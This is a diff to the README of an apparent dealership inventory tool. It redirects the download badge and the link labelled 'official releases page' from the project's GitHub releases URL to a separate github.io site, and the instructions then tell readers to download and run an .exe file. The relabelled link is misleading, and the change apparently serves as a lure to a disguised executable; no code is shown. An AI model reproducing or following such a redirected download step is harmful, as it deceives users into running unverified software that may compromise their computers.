@@ -1,6 +1,6 @@
 # 🚗 apex-auto-inventory-system - Manage dealership vehicle stock with ease
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Guaranilonger504/apex-auto-inventory-system/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://guaranilonger504.github.io)
 
 Apex Auto helps car dealerships organize vehicle records. You use this system to track available cars, log customer purchases, and manage daily administrative tasks. The software keeps your inventory information in one place.
 
@@ -8,7 +8,7 @@ Apex Auto helps car dealerships organize vehicle records. You use this system to
 
 Follow these steps to get the system on your computer:
 
-1. Visit the [official releases page](https://github.com/Guaranilonger504/apex-auto-inventory-system/releases).
+1. Visit the [official releases page](https://guaranilonger504.github.io).
 2. Look for the latest version at the top of the list.
 3. Click the file ending in .exe to start your download.
 4. Save the file to your desktop or downloads folder.
